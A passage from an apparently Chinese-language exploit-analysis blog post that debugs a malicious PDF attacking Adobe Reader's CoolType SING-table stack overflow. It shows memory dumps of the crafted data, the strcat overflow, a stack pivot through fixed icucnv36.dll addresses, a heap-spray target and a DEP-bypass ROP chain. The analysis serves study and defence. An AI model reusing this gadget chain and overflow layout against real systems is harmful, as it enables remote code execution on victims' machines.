class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0803DD7D    E8 843DFEFF     call CoolType.08021B06</span><br><span class="line">0803DD82    8B45 DC         mov eax,dword ptr ss:[ebp-0x24]</span><br></pre></td></tr></table></figure><p>来看看这里的eax变成了什么。</p><p>eax = 0x046BE598</p><p>数据窗口跟随就会发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">046BE598  00 00 01 00 01 0E 00 01  ....</span><br><span class="line">046BE5A0  00 00 00 00 00 00 00 3A  .......:</span><br><span class="line">046BE5A8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5B0  14 A7 82 4A 0C 0C 0C 0C  J....</span><br><span class="line">046BE5B8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5C0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5C8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5D0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5D8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5E0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5E8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5F0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE5F8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE600  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE608  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE610  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE618  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE620  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE628  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE630  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE638  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE640  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE648  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE650  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE658  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE660  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE668  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE670  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE678  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE680  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE688  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE690  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE698  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6A0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6A8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6B0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6B8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6C0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6C8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6D0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6D8  C6 08 8A 4A 41 41 41 41  ?奐AAAA</span><br><span class="line">046BE6E0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6E8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6F0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE6F8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE700  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE708  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE710  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE718  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE720  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE728  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE730  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE738  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE740  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE748  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE750  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE758  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE760  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE768  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE770  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE778  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE780  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE788  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE790  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE798  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7A0  38 CB 80 4A 41 41 41 41  8藔JAAAA</span><br><span class="line">046BE7A8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7B0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7B8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7C0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7C8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7D0  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7D8  41 41 41 41 41 41 41 41  AAAAAAAA</span><br><span class="line">046BE7E0  41 41 41 41 6C           AAAAl</span><br></pre></td></tr></table></figure><p>这里大量的A原本都是随机字符，由于刚才我们修改了exploit的代码因此使得这里的数据块更容易辨认。实际上这些数据都是样本中SING表里构造好的恶意数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0803</span>DD74    <span class="number">68</span> <span class="number">4</span>CDB1908     push CoolType<span class="number">.0819</span>DB4C   ; ASCII <span class="string">"SING"</span></span><br><span class="line"><span class="number">0803</span>DD79    <span class="number">57</span>               push edi</span><br><span class="line"><span class="number">0803</span>DD7A    <span class="number">8</span>D4D DC         lea ecx,dword ptr ss:[ebp<span class="number">-0x24</span>]</span><br><span class="line"><span class="number">0803</span>DD7D    E8 <span class="number">843</span>DFEFF     call CoolType<span class="number">.08021B</span>06</span><br><span class="line"><span class="number">0803</span>DD82    <span class="number">8B</span>45 DC         mov eax,dword ptr ss:[ebp<span class="number">-0x24</span>]</span><br></pre></td></tr></table></figure><p>因此总结一下，以上的指令主要就是将SING表的tag名传入到08021B06函数中通过表目录来获取到SING表的入口地址，而目前eax的值0x046BE598即是SING表的入口地址。分析SING表的这些数据，我们就能知道样本到底做了些什么。</p><p>继续往下动态调试，会发现关键的溢出点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0803DDA2    50              push eax</span><br><span class="line">0803DDA3    8D45 00         lea eax,dword ptr ss:[ebp]</span><br><span class="line">0803DDA6    50              push eax</span><br><span class="line">0803DDA7    C645 00 00      mov byte ptr ss:[ebp],0x0</span><br><span class="line">0803DDAB    E8 483D1300     call &lt;jmp.&amp;MSVCR80.strcat&gt;</span><br></pre></td></tr></table></figure><p>第一个pusheax 将刚刚获取到的SING表入口地址压入栈区。第二个 pusheax获取了当前栈区的ebp地址即要连接字符串的目的地址。我们单步过strcat之后，查看一下ebp开始的栈区数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">0012E4D8   41414141</span><br><span class="line">0012E4DC   41414141</span><br><span class="line">0012E4E0   4A82A714  icucnv36.4A82A714</span><br><span class="line">0012E4E4   0C0C0C0C</span><br><span class="line">0012E4E8   41414141</span><br><span class="line">0012E4EC   41414141</span><br><span class="line">0012E4F0   41414141</span><br><span class="line">0012E4F4   41414141</span><br><span class="line">0012E4F8   41414141</span><br><span class="line">0012E4FC   41414141</span><br><span class="line">0012E500   41414141</span><br><span class="line">0012E504   41414141</span><br><span class="line">0012E508   41414141</span><br><span class="line">0012E50C   41414141</span><br><span class="line">0012E510   41414141</span><br><span class="line">0012E514   41414141</span><br><span class="line">0012E518   41414141</span><br><span class="line">0012E51C   41414141</span><br><span class="line">0012E520   41414141</span><br><span class="line">0012E524   41414141</span><br><span class="line">0012E528   41414141</span><br><span class="line">0012E52C   41414141</span><br><span class="line">0012E530   41414141</span><br><span class="line">0012E534   41414141</span><br><span class="line">0012E538   41414141</span><br><span class="line">0012E53C   41414141</span><br><span class="line">0012E540   41414141</span><br><span class="line">0012E544   41414141</span><br><span class="line">0012E548   41414141</span><br><span class="line">0012E54C   41414141</span><br><span class="line">0012E550   41414141</span><br><span class="line">0012E554   41414141</span><br><span class="line">0012E558   41414141</span><br><span class="line">0012E55C   41414141</span><br><span class="line">0012E560   41414141</span><br><span class="line">0012E564   41414141</span><br><span class="line">0012E568   41414141</span><br><span class="line">0012E56C   41414141</span><br><span class="line">0012E570   41414141</span><br><span class="line">0012E574   41414141</span><br><span class="line">0012E578   41414141</span><br><span class="line">0012E57C   41414141</span><br><span class="line">0012E580   41414141</span><br><span class="line">0012E584   41414141</span><br><span class="line">0012E588   41414141</span><br><span class="line">0012E58C   41414141</span><br><span class="line">0012E590   41414141</span><br><span class="line">0012E594   41414141</span><br><span class="line">0012E598   41414141</span><br><span class="line">0012E59C   41414141</span><br><span class="line">0012E5A0   41414141</span><br><span class="line">0012E5A4   41414141</span><br><span class="line">0012E5A8   41414141</span><br><span class="line">0012E5AC   41414141</span><br><span class="line">0012E5B0   41414141</span><br><span class="line">0012E5B4   41414141</span><br><span class="line">0012E5B8   41414141</span><br><span class="line">0012E5BC   41414141</span><br><span class="line">0012E5C0   41414141</span><br><span class="line">0012E5C4   41414141</span><br><span class="line">0012E5C8   41414141</span><br><span class="line">0012E5CC   41414141</span><br><span class="line">0012E5D0   41414141</span><br><span class="line">0012E5D4   41414141</span><br><span class="line">0012E5D8   41414141</span><br><span class="line">0012E5DC   41414141</span><br><span class="line">0012E5E0   41414141</span><br><span class="line">0012E5E4   41414141</span><br><span class="line">0012E5E8   41414141</span><br><span class="line">0012E5EC   41414141</span><br><span class="line">0012E5F0   41414141</span><br><span class="line">0012E5F4   41414141</span><br><span class="line">0012E5F8   41414141</span><br><span class="line">0012E5FC   41414141</span><br><span class="line">0012E600   41414141</span><br><span class="line">0012E604   41414141</span><br><span class="line">0012E608   4A8A08C6  icucnv36.4A8A08C6</span><br><span class="line">0012E60C   41414141</span><br><span class="line">0012E610   41414141</span><br><span class="line">0012E614   41414141</span><br><span class="line">0012E618   41414141</span><br><span class="line">0012E61C   41414141</span><br><span class="line">0012E620   41414141</span><br><span class="line">0012E624   41414141</span><br><span class="line">0012E628   41414141</span><br><span class="line">0012E62C   41414141</span><br><span class="line">0012E630   41414141</span><br><span class="line">0012E634   41414141</span><br><span class="line">0012E638   41414141</span><br><span class="line">0012E63C   41414141</span><br><span class="line">0012E640   41414141</span><br><span class="line">0012E644   41414141</span><br><span class="line">0012E648   41414141</span><br><span class="line">0012E64C   41414141</span><br><span class="line">0012E650   41414141</span><br><span class="line">0012E654   41414141</span><br><span class="line">0012E658   41414141</span><br><span class="line">0012E65C   41414141</span><br><span class="line">0012E660   41414141</span><br><span class="line">0012E664   41414141</span><br><span class="line">0012E668   41414141</span><br><span class="line">0012E66C   41414141</span><br><span class="line">0012E670   41414141</span><br><span class="line">0012E674   41414141</span><br><span class="line">0012E678   41414141</span><br><span class="line">0012E67C   41414141</span><br><span class="line">0012E680   41414141</span><br><span class="line">0012E684   41414141</span><br><span class="line">0012E688   41414141</span><br><span class="line">0012E68C   41414141</span><br><span class="line">0012E690   41414141</span><br><span class="line">0012E694   41414141</span><br><span class="line">0012E698   41414141</span><br><span class="line">0012E69C   41414141</span><br><span class="line">0012E6A0   41414141</span><br><span class="line">0012E6A4   41414141</span><br><span class="line">0012E6A8   41414141</span><br><span class="line">0012E6AC   41414141</span><br><span class="line">0012E6B0   41414141</span><br><span class="line">0012E6B4   41414141</span><br><span class="line">0012E6B8   41414141</span><br><span class="line">0012E6BC   41414141</span><br><span class="line">0012E6C0   41414141</span><br><span class="line">0012E6C4   41414141</span><br><span class="line">0012E6C8   41414141</span><br><span class="line">0012E6CC   41414141</span><br><span class="line">0012E6D0   4A80CB38  返回到 icucnv36.4A80CB38 来自 icucnv36.4A846C49</span><br><span class="line">0012E6D4   41414141</span><br><span class="line">0012E6D8   41414141</span><br><span class="line">0012E6DC   41414141</span><br><span class="line">0012E6E0   41414141</span><br><span class="line">0012E6E4   41414141</span><br><span class="line">0012E6E8   41414141</span><br><span class="line">0012E6EC   41414141</span><br><span class="line">0012E6F0   41414141</span><br><span class="line">0012E6F4   41414141</span><br><span class="line">0012E6F8   41414141</span><br><span class="line">0012E6FC   41414141</span><br><span class="line">0012E700   41414141</span><br><span class="line">0012E704   41414141</span><br><span class="line">0012E708   41414141</span><br><span class="line">0012E70C   41414141  指向下一个 SEH 记录的指针</span><br><span class="line">0012E710   41414141  SE处理程序</span><br><span class="line">0012E714   0000006C</span><br></pre></td></tr></table></figure><p>此时栈溢出已经发生，栈区数据已经被修改成了SING表中构造的恶意数据(实际上是从uniqueName字段开始的数据)。</p><p>继续往下分析，我们希望了解程序到底是怎么样去读取栈区数据的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0808B308    FF10            call dword ptr ds:[eax]</span><br></pre></td></tr></table></figure><p>执行到0x0808B308时，我们发现了一个很有意思的地方。即调用了[eax]地址指向的函数。此时的eax = 0012E6D0，这正好处于我们刚才覆盖的栈区数据范围内。</p><p>且 [eax]= 0x4A80CB38。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>A80CB38    <span class="number">81</span>C5 <span class="number">94070000</span>   add ebp,<span class="number">0x794</span></span><br><span class="line"><span class="number">4</span><span class="function">A80CB3E    C9              <span class="title">leave</span>  <span class="params">(mov esp,ebp  pop ebp)</span></span></span><br><span class="line"><span class="function">4A80CB3F    C3              retn</span></span><br></pre></td></tr></table></figure><p>首先调整了ebp。原本的ebp = 0x0012DD48 ebp+0x794 = 0x0012E4DC</p><p>重新将ebp调整进了覆盖的栈区数据范围内。接下来执行的leave，修改了esp，原本的esp = 0x0012DD24 esp = ebp = 0x0012E4DC [esp] = 0x41414141 并且弹栈之后</p><p>ebp = 0x41414141</p><p>最后retn时，esp = 0x0012E4E0 [esp] = 0x4A82A714 因此接下来EIP = 0x4A82A714</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4A82A714    5C              pop esp                  ; 0C0C0C0C</span><br><span class="line">4A82A715    C3              retn</span><br></pre></td></tr></table></figure><p>这里原本的esp= 0x0012E4E4 [esp] = 0x0C0C0C0C</p><p>pop esp之后 esp = 0x0C0C0C0C</p><p>跳转地址的稳定性其实主要依靠0x4A82A714和0x4A80CB38这两处的地址，他们都位于icucnv36.dll的地址，而在Aodobe Reader的各种版本上，这个dll上的这两处地址是始终不变的，因而保持了各版本的兼容性和Exp的稳定性。上面的0C0C0C0C正是样本特意构造的，然后通过嵌入到pdf的JavaScripe实现<a href="[https://v1ckydxp.github.io/2019/07/22/2019-07-22-%E5%A0%86%E5%96%B7%E5%B0%84&%E5%A0%86%E9%A3%8E%E6%B0%B4/](https://v1ckydxp.github.io/2019/07/22/2019-07-22-堆喷射&堆风水/)">Heap Spary</a>,进而跳入shellcode执行代码。0x0C0C0C0C正是绕过DEP的关键部分</p><p>让我们看下0x0C0C0C0C处的内容,也就是我们接下来要执行的ROP链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">0C0C0C0C   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0C10   4A8A0000  icucnv36.4A8A0000</span><br><span class="line">0C0C0C14   4A802196  icucnv36.4A802196</span><br><span class="line">0C0C0C18   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0C1C   4A84903C  &lt;&amp;KERNEL32.CreateFileA&gt;</span><br><span class="line">0C0C0C20   4A80B692  icucnv36.4A80B692</span><br><span class="line">0C0C0C24   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0C28   4A8522C8  icucnv36.4A8522C8</span><br><span class="line">0C0C0C2C   10000000  sqlite.10000000</span><br><span class="line">0C0C0C30   00000000</span><br><span class="line">0C0C0C34   00000000</span><br><span class="line">0C0C0C38   00000002</span><br><span class="line">0C0C0C3C   00000102</span><br><span class="line">0C0C0C40   00000000</span><br><span class="line">0C0C0C44   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0C48   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0C4C   4A842DB2  icucnv36.4A842DB2</span><br><span class="line">0C0C0C50   4A802AB1  icucnv36.4A802AB1</span><br><span class="line">0C0C0C54   00000008</span><br><span class="line">0C0C0C58   4A80A8A6  icucnv36.4A80A8A6</span><br><span class="line">0C0C0C5C   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0C60   4A849038  &lt;&amp;KERNEL32.CreateFileMappingA&gt;</span><br><span class="line">0C0C0C64   4A80B692  icucnv36.4A80B692</span><br><span class="line">0C0C0C68   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0C6C   FFFFFFFF</span><br><span class="line">0C0C0C70   00000000</span><br><span class="line">0C0C0C74   00000040</span><br><span class="line">0C0C0C78   00000000</span><br><span class="line">0C0C0C7C   00010000  UNICODE &quot;=::=::\&quot;</span><br><span class="line">0C0C0C80   00000000</span><br><span class="line">0C0C0C84   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0C88   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0C8C   4A842DB2  icucnv36.4A842DB2</span><br><span class="line">0C0C0C90   4A802AB1  icucnv36.4A802AB1</span><br><span class="line">0C0C0C94   00000008</span><br><span class="line">0C0C0C98   4A80A8A6  icucnv36.4A80A8A6</span><br><span class="line">0C0C0C9C   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0CA0   4A849030  &lt;&amp;KERNEL32.MapViewOfFile&gt;</span><br><span class="line">0C0C0CA4   4A80B692  icucnv36.4A80B692</span><br><span class="line">0C0C0CA8   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0CAC   FFFFFFFF</span><br><span class="line">0C0C0CB0   00000022</span><br><span class="line">0C0C0CB4   00000000</span><br><span class="line">0C0C0CB8   00000000</span><br><span class="line">0C0C0CBC   00010000  UNICODE &quot;=::=::\&quot;</span><br><span class="line">0C0C0CC0   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0CC4   4A8A0004  UNICODE &quot;社&quot;</span><br><span class="line">0C0C0CC8   4A802196  icucnv36.4A802196</span><br><span class="line">0C0C0CCC   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0CD0   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0CD4   4A842DB2  icucnv36.4A842DB2</span><br><span class="line">0C0C0CD8   4A802AB1  icucnv36.4A802AB1</span><br><span class="line">0C0C0CDC   00000030</span><br><span class="line">0C0C0CE0   4A80A8A6  icucnv36.4A80A8A6</span><br><span class="line">0C0C0CE4   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0CE8   4A8A0004  UNICODE &quot;社&quot;</span><br><span class="line">0C0C0CEC   4A80A7D8  返回到 icucnv36.uprv_timezone_3_6+6 来自 msvcr80.__timezone</span><br><span class="line">0C0C0CF0   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0CF4   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0CF8   4A842DB2  icucnv36.4A842DB2</span><br><span class="line">0C0C0CFC   4A802AB1  icucnv36.4A802AB1</span><br><span class="line">0C0C0D00   00000020</span><br><span class="line">0C0C0D04   4A80A8A6  icucnv36.4A80A8A6</span><br><span class="line">0C0C0D08   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0D0C   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0D10   4A80AEDC  icucnv36.4A80AEDC</span><br><span class="line">0C0C0D14   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0D18   00000034</span><br><span class="line">0C0C0D1C   4A80D585  icucnv36.4A80D585</span><br><span class="line">0C0C0D20   4A8063A5  icucnv36.4A8063A5</span><br><span class="line">0C0C0D24   4A801064  icucnv36.4A801064</span><br><span class="line">0C0C0D28   4A842DB2  icucnv36.4A842DB2</span><br><span class="line">0C0C0D2C   4A802AB1  icucnv36.4A802AB1</span><br><span class="line">0C0C0D30   0000000A</span><br><span class="line">0C0C0D34   4A80A8A6  icucnv36.4A80A8A6</span><br><span class="line">0C0C0D38   4A801F90  icucnv36.4A801F90</span><br><span class="line">0C0C0D3C   4A849170  &lt;&amp;MSVCR80.memcpy&gt;</span><br><span class="line">0C0C0D40   4A80B692  icucnv36.4A80B692</span><br></pre></td></tr></table></figure><p>继续动态分析。此时即将执行retn，而esp指向的地址是0x0c0c0c0c，即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0C0C0C0C   4A8063A5  icucnv36.4A8063A5</span><br></pre></td></tr></table></figure><p>再继续动态分析之前，不妨先猜一下会发生什么，以免我们在浩瀚的汇编代码中迷失自己</p><p>可以从shellcode中看到我们主要指令了这么几个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;&amp;KERNEL32.CreateFileA&gt;</span><br><span class="line">&lt;&amp;KERNEL32.CreateFileMappingA&gt;</span><br><span class="line">&lt;&amp;KERNEL32.MapViewOfFile&gt;</span><br><span class="line">&lt;&amp;MSVCR80.<span class="built_in">memcpy</span>&gt;</span><br></pre></td></tr></table></figure><p>接下来继续动态调试</p><p><img src="/04/ckur473d8000cab155bfomfcj/2.png" alt></p><p><img 